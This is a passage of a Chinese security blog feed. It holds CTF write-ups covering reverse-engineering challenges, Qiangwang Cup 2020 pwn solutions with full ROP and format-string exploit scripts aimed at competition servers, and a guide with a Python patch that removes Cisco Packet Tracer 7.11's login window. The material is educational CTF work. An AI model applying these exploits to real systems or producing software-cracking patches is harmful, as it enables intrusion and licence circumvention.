)</code></pre></div><p>明显这是都需要进行满足的。<br>然后求解一下：</p><div class="hljs"><pre><code class="hljs bash">In [6]: hex(926180401)Out[6]: <span class="hljs-string">'0x37346431'</span> (v17)In [7]: hex(1915971957)Out[7]: <span class="hljs-string">'0x72336975'</span>. (v18)</code></pre></div><p>这样大数据进行判断，其实也是判断字符的，转码一下：</p><p><code>0x37346431:74d1  0x72336975 :r3iu</code><br>但是因为在内存中，其是小端序的，需要反转一下。<br>猜测flag就是<code>nemo_pwned_n1d47ui3r</code>。其长度正好就是20位。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/mDsH7W.png" srcset="/img/loading.gif" alt><br>经过验证的确是的。</p><h2 id="ICS-13"><a href="#ICS-13" class="headerlink" title="ICS_13"></a><code>ICS_13</code></h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/gvE3nU.png" srcset="/img/loading.gif" alt><br>十分简单，自己输入的东西减去0x14，和<code>10445678951</code>进行一个个字节的比较，相等就ok。</p><div class="hljs"><pre><code class="hljs bash">key = <span class="hljs-string">'10445678951'</span>key = [ord(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> key]flag = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> key :    flag += chr(i+0x14)<span class="hljs-built_in">print</span>(flag)</code></pre></div><h2 id="ICS-2"><a href="#ICS-2" class="headerlink" title="ICS_2"></a><code>ICS_2</code></h2><p>先脱壳，esp定律脱壳。也可以用万能脱壳机进行脱。<br>由于给了提示，是需要找一个ip。很简单的思路就是直接找可疑ip。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/OjHdLY.png" srcset="/img/loading.gif" alt></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/Y2gpgp.png" srcset="/img/loading.gif" alt></p><p>x32dbg直接断在这里，向下跟。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/2Nsxbj.png" srcset="/img/loading.gif" alt><br>发现可疑ip，提交就对了。</p><h2 id="ICS-14"><a href="#ICS-14" class="headerlink" title="ICS_14"></a><code>ICS_14</code></h2><p>程序就是很简单找到注册码。<br>邮箱可以乱输入，但是要保证<code>@</code> + <code>xx</code> + <code>.</code> + <code>xx</code></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/f3gbCC.png" srcset="/img/loading.gif" alt><br>这里有函数进行控制判断。<br>如果不对就会说，邮箱不合法。<br>接着看流程：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/UDpOQ0.png" srcset="/img/loading.gif" alt></p><p>这块在判断一堆东西，推测就是注册码。<br>往上一看，可以看到这一条。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/zigrXA.png" srcset="/img/loading.gif" alt><br>明显是ida无法识别，其是还是一个字符串。</p><p>然后就是一个个转字符串，以v12-v27整合一下,<code>BZ9dmq4c8g9G7bAY</code>出来这个。<br>并且可以看到判断就是16位。<br>然后进行输入判断:<br><img src="http://qiqianyun.chumen77.xyz/uPic/8zufHQ.png" srcset="/img/loading.gif" alt><br>就很简单成功拿到。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;工控wp&quot;&gt;&lt;a href=&quot;#工控wp&quot; class=&quot;headerlink&quot; title=&quot;工控wp&quot;&gt;&lt;/a&gt;工控wp&lt;/h1&gt;&lt;h2 id=&quot;ICS-8&quot;&gt;&lt;a href=&quot;#ICS-8&quot; class=&quot;headerlink&quot; title=&quot;ICS_8&quot;&gt;
      
    
    </summary>
    
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
      <category term="misc" scheme="http://chumen77.xyz/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>实战去除packet tracer登陆窗口</title>
    <link href="http://chumen77.xyz/2020/09/07/%E5%AE%9E%E6%88%98%E5%8E%BB%E9%99%A4packet%20tracer%E7%99%BB%E9%99%86%E7%AA%97%E5%8F%A3/"/>
    <id>http://chumen77.xyz/2020/09/07/实战去除packet tracer登陆窗口/</id>
    <published>2020-09-07T09:11:40.744Z</published>
    <updated>2020-09-12T09:14:20.389Z</updated>
    
    <content type="html"><![CDATA[<h1 id="实战去除思科packet-tracer登陆窗口"><a href="#实战去除思科packet-tracer登陆窗口" class="headerlink" title="实战去除思科packet tracer登陆窗口"></a>实战去除思科packet tracer登陆窗口</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>专业课开设了路由交换这门课，其中要经常使用packet tracer这个软件，但是没有注册的话，每次登陆都需要等待15s，就尝试破解一下。</p><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>破除等待的15s，最好直接去除掉登陆窗口。但是老师上课给我们演示过，有个吾爱破解的插件是直接破解掉登陆窗口的，就直接奔着这个目标去。</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ul><li>win7 模拟器</li><li>packet tracer 7.11</li><li>x64dbg</li></ul><h2 id="破解过程记录"><a href="#破解过程记录" class="headerlink" title="破解过程记录"></a>破解过程记录</h2><h3 id="寻找突破口"><a href="#寻找突破口" class="headerlink" title="寻找突破口"></a>寻找突破口</h3><p>￼在弹出登陆界面时，最上方会有 <code>netacad.com Login</code>的字眼，先就选择这里作为关键字符串。<br>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/K55z1P.jpg" srcset="/img/loading.gif" alt><br>在这个exe的程序下搜索字符串。<br><img src="http://qiqianyun.chumen77.xyz/uPic/H1st15.jpg" srcset="/img/loading.gif" alt><br>端口可疑字符串对应的汇编指令。</p><p>然后开始f9一直运行，在这个<code>netacad.com Login</code>，运行其后的软件会发现，的确开启了登陆的窗口。这样就可以确定，关键处就在这里。<br><img src="http://qiqianyun.chumen77.xyz/uPic/6Hr3Tw.png" srcset="/img/loading.gif" alt><br>向下看可以看到，一些登陆失败的字符串，那就无疑是这一块的函数控制着这个登陆窗口。</p><p>向上看可以看到，有几个小跳转，和一个大跳转，然后追过去可以发现，是可以绕过这些关键函数的。那就很简单了，尝试改成<code>jmp</code> 无条件跳转一下试一试。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/f42dGL.png" srcset="/img/loading.gif" alt></p><p>然后直接运行一下，然后的确是成功了，去掉了登陆框。</p><p>然后进行保存补丁，替换主程序即可。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/OikyWs.png" srcset="/img/loading.gif" alt></p><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>的确是找到了关键处，感觉整个过程还是很简单的，由于前人经验就是从登陆界面下手的，我也是直接跟随这个思路操作。在完工以后，尝试去搞一下15s哪里的验证，想点一下直接变为0s，可以点击确认，发现是的确麻烦也没有成功就放弃了。</p><h2 id="半自动化打补丁"><a href="#半自动化打补丁" class="headerlink" title="半自动化打补丁"></a>半自动化打补丁</h2><p>不太会写c，用python 写了打补丁的程序，确保本机有python2的运行环境。然后把脚本放在其安装路径的bin目录下，运行即可。</p><p>也可以把程序拖出来，打完补丁后替换原来的程序即可。</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2.7</span><span class="hljs-keyword">import</span> struct<span class="hljs-keyword">import</span> os<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">WriteFile</span><span class="hljs-params">()</span>:</span>    <span class="hljs-keyword">with</span> open(<span class="hljs-string">'PacketTracer7.exe'</span>,<span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> f:         dt = f.read()    dt = dt[:<span class="hljs-number">0x17a5245</span>]+<span class="hljs-string">'\xe9\xee\x04\x00\x00\x90'</span>+dt[<span class="hljs-number">0x17a524b</span>:]    <span class="hljs-keyword">with</span> open(<span class="hljs-string">'PacketTracer7.exe'</span>, <span class="hljs-string">'w'</span>) <span class="hljs-keyword">as</span> f:        f.write(dt)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:WriteFile()</code></pre></div><p>针对的只是7.11。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;实战去除思科packet-tracer登陆窗口&quot;&gt;&lt;a href=&quot;#实战去除思科packet-tracer登陆窗口&quot; class=&quot;headerlink&quot; title=&quot;实战去除思科packet tracer登陆窗口&quot;&gt;&lt;/a&gt;实战去除思科packet trac
      
    
    </summary>
    
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>强网杯2020部分题目</title>
    <link href="http://chumen77.xyz/2020/08/24/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/"/>
    <id>http://chumen77.xyz/2020/08/24/强网杯2020部分题目/</id>
    <published>2020-08-24T02:34:05.216Z</published>
    <updated>2020-09-23T12:02:35.653Z</updated>
    
    <content type="html"><![CDATA[<h1 id="强网杯2020-部分题目"><a href="#强网杯2020-部分题目" class="headerlink" title="强网杯2020 部分题目"></a>强网杯2020 部分题目</h1><h2 id="babymessage"><a href="#babymessage" class="headerlink" title="babymessage"></a>babymessage</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><span class="hljs-attr"> RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><span class="hljs-attr"> Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><span class="hljs-attr"> NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr"> PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x3fe000)</span></code></pre></div><p>基本保护不算多。</p><p>是一个伪堆题。</p><h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>在 <code>leave_message(v1)</code>函数这里的v1上来取值就是16</p><div class="hljs"><pre><code class="hljs c">__int64 __<span class="hljs-function">fastcall <span class="hljs-title">leave_message</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a1)</span></span>&#123;  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// ST14_4</span>  __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"message: "</span>);  v1 = read(<span class="hljs-number">0</span>, &amp;v3, a1);  <span class="hljs-built_in">strncpy</span>(buf, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)&amp;v3, v1);  buf[v1] = <span class="hljs-number">0</span>;  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"done!\n"</span>);  <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;&#125;</code></pre></div><p>进入以后可以发现，v3是只有8字节大小的，可以溢出8字节，可以覆盖到rbp。</p><h5 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h5><div class="hljs"><pre><code class="hljs undefined">.text:<span class="hljs-number">0000000000400985</span> ; <span class="hljs-number">22</span>:         <span class="hljs-keyword">if</span> ( v1 &gt; <span class="hljs-number">256</span> ).text:<span class="hljs-number">0000000000400985</span>                 cmp     [rbp+var_4], <span class="hljs-number">100</span>h.text:<span class="hljs-number">000000000040098</span>C                 jle     short loc_400995.text:<span class="hljs-number">000000000040098</span>E ; <span class="hljs-number">23</span>:           v1 = <span class="hljs-number">256</span>;.text:<span class="hljs-number">000000000040098</span>E                 mov     [rbp+var_4], <span class="hljs-number">100</span>h.text:<span class="hljs-number">0000000000400995</span> ; <span class="hljs-number">24</span>:         leave_message(v1);</code></pre></div><p>在进入<code>leave_message(v1)</code>前v1有一个对于0x100大小的判断，要是v1大于0x100就给设置为0x100。这就可以实现栈溢出，进行rop。</p><p>怎么控制v1：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span></code></pre></div><p>可以明显看到v1在rbp-4的地址，然后rbp，也可以进行溢出覆盖，覆盖到合适的地方后，保障-4后，有个int大小的大于等于0x100的值即可。</p><p>这个合适地址，可以从<code>leave_name()</code> 下手，因为其往bss段读了值。</p><div class="hljs"><pre><code class="hljs undefined">byte_6010D0[(signed <span class="hljs-built_in">int</span>)read(<span class="hljs-number">0</span>, byte_6010D0, <span class="hljs-number">4</span>uLL)] = <span class="hljs-number">0</span>;</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/8uyl03.png" srcset="/img/loading.gif" alt></p><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><ul><li>构造rop链，泄漏出libc的地址，返回start，让程序重新跑起来，清理栈</li><li>再次利用，控制ret address 为<code>one_gadget</code></li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./babymessage'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'123.56.170.202'</span>,<span class="hljs-number">21342</span>)    libc = elf.libc    libc = ELF(<span class="hljs-string">'./libc-2.27.so'</span>)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()pop_rdi = <span class="hljs-number">0x0000000000400ac3</span>start = <span class="hljs-number">0x04006E0</span>sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)sa(<span class="hljs-string">'name'</span>,p32(<span class="hljs-number">0xffff</span>))sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)payload = p64(<span class="hljs-number">0x02000200</span>) + p64(<span class="hljs-number">0x06010D0</span>+<span class="hljs-number">4</span>)sa(<span class="hljs-string">'mes'</span>,payload)sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)rop = flat([pop_rdi,elf.got[<span class="hljs-string">'__libc_start_main'</span>],elf.plt[<span class="hljs-string">'puts'</span>],start])payload = p64(<span class="hljs-number">0x02000200</span>) + p64(<span class="hljs-number">0x06010D0</span>+<span class="hljs-number">4</span>)payload +=ropsa(<span class="hljs-string">'mes'</span>,payload)ru(<span class="hljs-string">'done!'</span>)r(<span class="hljs-number">2</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - libc.sym[<span class="hljs-string">'__libc_start_main'</span>]info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)sa(<span class="hljs-string">'name'</span>,p32(<span class="hljs-number">0xffff</span>))sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)<span class="hljs-comment"># debug()</span>payload = p64(<span class="hljs-number">0x02000200</span>) + p64(<span class="hljs-number">0x06010D0</span>+<span class="hljs-number">4</span>)sa(<span class="hljs-string">'mes'</span>,payload)rec = <span class="hljs-number">0x10a45c</span> + libc_basesla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)rop = p64(rec)payload = p64(<span class="hljs-number">0x02000200</span>) + p64(<span class="hljs-number">0x06010D0</span>+<span class="hljs-number">4</span>)payload +=ropsa(<span class="hljs-string">'mes'</span>,payload)itr()</code></pre></div><div class="hljs"><pre><code class="hljs python">flag&#123;f4c1c2c2407055f2665dec486e7d1b16&#125;</code></pre></div><h2 id="Siri"><a href="#Siri" class="headerlink" title="Siri"></a>Siri</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>保护全开。栈上的格式化字符串漏洞，并且可以无限次触发。</p><h4 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">signed</span> __int64 __<span class="hljs-function">fastcall <span class="hljs-title">sub_1212</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *a1)</span></span>&#123;  <span class="hljs-keyword">char</span> *v2; <span class="hljs-comment">// [rsp+18h] [rbp-128h]</span>  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [rsp+20h] [rbp-120h]</span>  <span class="hljs-keyword">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+138h] [rbp-8h]</span>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);  v2 = <span class="hljs-built_in">strstr</span>(a1, <span class="hljs-string">"Remind me to "</span>);  <span class="hljs-keyword">if</span> ( !v2 )    <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x110</span>uLL);  <span class="hljs-built_in">sprintf</span>(&amp;s, <span class="hljs-string">"&gt;&gt;&gt; OK, I'll remind you to %s"</span>, v2 + <span class="hljs-number">13</span>);  <span class="hljs-built_in">printf</span>(&amp;s);  <span class="hljs-built_in">puts</span>(&amp;::s);  <span class="hljs-keyword">return</span> <span class="hljs-number">1L</span>L;&#125;</code></pre></div><p>发现存在格式化字符串，但是你所输入的都会被sprintf处理以后给printf函数。由于其是<code>%s</code>来处理数据，这就让直接在栈上写地址，然后攻击造成了难度。<br>但是调试可以发现，其实输入的东西还会保留在栈上，因为sprintf处理数据也是从栈上拿的，所以会被保留的。</p><h4 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h4><ul><li>第一次触发，泄漏出libc地址，stack地址。</li><li>执行到printf准备触发格式化字符串漏洞时，用sprintf残留栈上的数据（在0x100后），这个需要精心构造好后，进行攻击ret address。需要一次性改好。</li></ul><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'123.56.170.202'</span>,<span class="hljs-number">12124</span>)    <span class="hljs-comment"># libc = elf.libc</span>    libc = ELF(<span class="hljs-string">'./libc.so.6'</span>)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">start_attc</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'Hey Siri!'</span>)    r()a = <span class="hljs-string">'Remind me to '</span>start_attc()payload = str(a) + <span class="hljs-string">'%83$p'</span> + <span class="hljs-string">'bbb'</span> + <span class="hljs-string">'%7$p'</span><span class="hljs-comment"># ru('&gt;&gt;&gt;')</span>s(payload)ru(<span class="hljs-string">'0x'</span>)libc_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x21b97</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)ru(<span class="hljs-string">'bbb0x'</span>)stack_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x150</span>info_addr(<span class="hljs-string">'stack_base'</span>,stack_base)tag = stack_base + <span class="hljs-number">0x148</span>start_attc()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt_short</span><span class="hljs-params">(prev,val,idx,byte = <span class="hljs-number">2</span>)</span>:</span>    result = <span class="hljs-string">""</span>    <span class="hljs-keyword">if</span> prev &lt; val :        result += <span class="hljs-string">"%"</span> + str(val - prev) + <span class="hljs-string">"c"</span>    <span class="hljs-keyword">elif</span> prev == val :        result += <span class="hljs-string">''</span>    <span class="hljs-keyword">else</span> :        result += <span class="hljs-string">"%"</span> + str(<span class="hljs-number">256</span>**byte - prev + val) + <span class="hljs-string">"c"</span>    result += <span class="hljs-string">"%"</span> + str(idx) + <span class="hljs-string">"$hn"</span>    <span class="hljs-keyword">return</span> resultprev = <span class="hljs-number">27</span>fmtpayload = <span class="hljs-string">""</span>key = <span class="hljs-number">0x4f365</span> + libc_baseinfo_addr(<span class="hljs-string">'key'</span>,key)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):    fmtpayload +=fmt_short(prev,(key &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">55</span>+i)     prev = (key &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span>print(fmtpayload)payload = str(a) + fmtpayloadpayload +=<span class="hljs-string">'aaa'</span> + <span class="hljs-string">'b'</span> + p64(tag)[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] + <span class="hljs-string">'\x00'</span>*<span class="hljs-number">2</span> + p64(tag+<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] + <span class="hljs-string">'\x00'</span>*<span class="hljs-number">2</span>  + p64(tag+<span class="hljs-number">4</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] + <span class="hljs-string">'\x00'</span>*<span class="hljs-number">2</span> + p64(tag+<span class="hljs-number">6</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] + <span class="hljs-string">'\x00'</span>*<span class="hljs-number">2</span>s(payload)itr()</code></pre></div><div class="hljs"><pre><code class="hljs python">flag&#123;da8836b9e9df3db44fe4bd7f39d4f7ab&#125;</code></pre></div><h2 id="water-re"><a href="#water-re" class="headerlink" title="water_re"></a><code>water_re</code></h2><p>Ida反编译后的代码比较难看，发现重点数据造成了困难，就采取动态调试。</p><p>基本流程就是，gets一段你输入的flag，读入后用<code>sub_12f0_</code>进行处理，然后给<code>v10</code> <code>v11</code> <code>v12</code>  <code>v13</code> 判断是否相等。其实也就是一个个字符来进行对比。</p><h3 id="sub-12F0-加密函数"><a href="#sub-12F0-加密函数" class="headerlink" title="sub_12F0_加密函数"></a><code>sub_12F0_</code>加密函数</h3><div class="hljs"><pre><code class="hljs python">_BYTE *__fastcall sub_12F0(_BYTE *a1)&#123;  _BYTE *result; // rax  int v2; // esi  __int64 v3; // r8  __int64 v4; // rdx  __int64 v5; // rax  int v6; // ecx  char v7; // r8  char v8; // dl  __asm &#123; endbr64 &#125;  result = (_BYTE *)sub_1090();  <span class="hljs-keyword">if</span> ( (signed int)result &lt;= <span class="hljs-number">0</span> )    <span class="hljs-keyword">return</span> result;  v2 = (signed int)result;  v3 = (unsigned int)((_DWORD)result - <span class="hljs-number">1</span>);  v4 = <span class="hljs-number">0L</span>L;  do  &#123;    a1[v4] = (a1[v4] ^ byte_4010[(unsigned int)v4 % <span class="hljs-number">7</span>]) + <span class="hljs-number">65</span>;    v5 = v4++;  &#125;  <span class="hljs-keyword">while</span> ( v3 != v5 );  v6 = <span class="hljs-number">0</span>;  do  &#123;    v7 = a1[<span class="hljs-number">3</span>];    result = a1 + <span class="hljs-number">3</span>;    do    &#123;      v8 = *(result-- - <span class="hljs-number">1</span>);      result[<span class="hljs-number">1</span>] = v8;    &#125;    <span class="hljs-keyword">while</span> ( a1 != result );    v6 += <span class="hljs-number">4</span>;    *a1 = v7;    a1 += <span class="hljs-number">4</span>;  &#125;  <span class="hljs-keyword">while</span> ( v2 &gt; v6 );  <span class="hljs-keyword">return</span> result;&#125;</code></pre></div><p>动态调试，进行起来很容易看懂。上来就是一个对输入的东西进行一个与<code>byte_4010</code>的字符<code>&#39;Q&#39;, &#39;W&#39;, &#39;B&#39;, &#39;l&#39;, &#39;o&#39;, &#39;g&#39;, &#39;s&#39;</code> 7组来进行一个异或和+65。</p><p>然后下面：</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">while</span> ( v3 != v5 ); v6 = <span class="hljs-number">0</span>; do &#123;   v7 = a1[<span class="hljs-number">3</span>];   result = a1 + <span class="hljs-number">3</span>;   do   &#123;     v8 = *(result-- - <span class="hljs-number">1</span>);     result[<span class="hljs-number">1</span>] = v8;   &#125;   <span class="hljs-keyword">while</span> ( a1 != result );   v6 += <span class="hljs-number">4</span>;   *a1 = v7;   a1 += <span class="hljs-number">4</span>; &#125;</code></pre></div><p>只看着让人头大，输入<code>flag{11111111111111111111111111111111111111111}</code> 动态调试一下发现：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/oqoJ2Y.png" srcset="/img/loading.gif" alt></p><p>分析这2组数据就会发现，每次对4个数据为一组进行处理。处理后结果就是原来的： <code>v1 &gt; v2 &gt; v3 &gt; v4</code> 变为 <code>v4 &gt; v1 &gt; v2 &gt; v3</code> 这样的结果。</p><p>然后处理完就给<code>v10</code> <code>v11</code> <code>v12</code>  <code>v13</code> 判断是否相等。这肯定为一串处理过的字符串，ida中也可以找到，直接提取有点害怕提取错，动调时提取一下出来：</p><div class="hljs"><pre><code class="hljs python">tag1=[<span class="hljs-number">0x4C</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x49</span>,<span class="hljs-number">0x76</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x4E</span>,<span class="hljs-number">0x66</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x69</span>,<span class="hljs-number">0x79</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x44</span>]</code></pre></div><p>也就是这一段数据。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><p>自己直接手动替换的数据。</p><div class="hljs"><pre><code 